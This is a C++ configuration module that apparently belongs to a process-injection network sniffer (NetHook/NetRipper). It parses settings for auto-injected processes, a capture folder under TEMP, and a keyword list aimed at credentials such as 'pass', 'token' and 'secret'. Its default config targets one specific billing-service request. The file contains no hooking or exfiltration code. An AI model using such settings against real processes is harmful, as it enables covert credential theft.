
#include "stdafx.h"
#include "DynConfig.h"

// Class data

string DynConfig::s_sDataPath     = "TEMP";
string DynConfig::s_sPlainText    = "false";
string DynConfig::s_sDataLimit    = "65535";
string DynConfig::s_sStringFinder = "user,login,pass,config,token,secret,auth";
string DynConfig::s_sProcessList = "";
bool DynConfig::s_bEnablePcap = false;

// Default settings

string DynConfig::s_sConfigurationString = 
	"<NetHook><plaintext>false</plaintext><datalimit>65535</datalimit><stringfinder>GET /amchargepls?service=page/acct.charge.payrecvagent&</stringfind"
	"er><data_path>TEMP</data_path><processes></processes><pcap>false</pcap></NetHook>-----------------"
	"----------------------------------------------------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------"
	"----------------------------------------------------------------------------------------------------";

// Read and parse configuration data

void DynConfig::Init()
{
	s_sDataPath     = Utils::GetStringBetween(s_sConfigurationString, "<data_path>", "</data_path>");
	s_sPlainText    = Utils::GetStringBetween(s_sConfigurationString, "<plaintext>", "</plaintext>");
	s_sDataLimit    = Utils::GetStringBetween(s_sConfigurationString, "<datalimit>", "</datalimit>");
	s_sStringFinder = Utils::GetStringBetween(s_sConfigurationString, "<stringfinder>", "</stringfinder>");
	s_sProcessList  = Utils::GetStringBetween(s_sConfigurationString, "<processes>", "</processes>");
	s_bEnablePcap = Utils::GetStringBetween(s_sConfigurationString, "<pcap>", "</pcap>").compare("true") == 0;
}

// Get plaintext plugin config

string DynConfig::GetPlainText()
{
	return s_sPlainText;
}

// Get datalimit plugin config

string DynConfig::GetDataLimit()
{
	return s_sDataLimit;
}

// Get stringfinder plugin config

string DynConfig::GetStringFinder()
{
	return s_sStringFinder;
}

// Get process list to auto-inject

string DynConfig::GetProcessList()
{
	return s_sProcessList;
}

bool DynConfig::GetEnablePcap()
{
	return s_bEnablePcap;
}

// Get the data path, create folder if it does not exists

string DynConfig::GetDataPath()
{
	char buffer[MAX_TEMP_PATH] = {0};
	string sPath = "";

	// If it is default configured to use TEMP

	if(s_sDataPath.compare("TEMP") == 0)
	{
		// Get Temp path

		if(GetTempPath(MAX_TEMP_PATH, buffer) == 0)
		{
			DebugLog::DebugError("[ERROR] Cannot get temporary path to save data!");
			return "";
		}

		sPath = buffer;
		sPath = sPath + "NetHook";
	}
	else sPath = s_sDataPath;

	// Create DIRECTORY if does not exist

	if(CreateDirectory(sPath.c_str(), NULL) == 0)
	{
		if(GetLastError() != ERROR_ALREADY_EXISTS)
		{
			DebugLog::DebugError("[ERROR] Cannot create NetRipper directory to save data!");
			return "";
		}
	}

	sPath = sPath + "\\";

	return sPath;
}
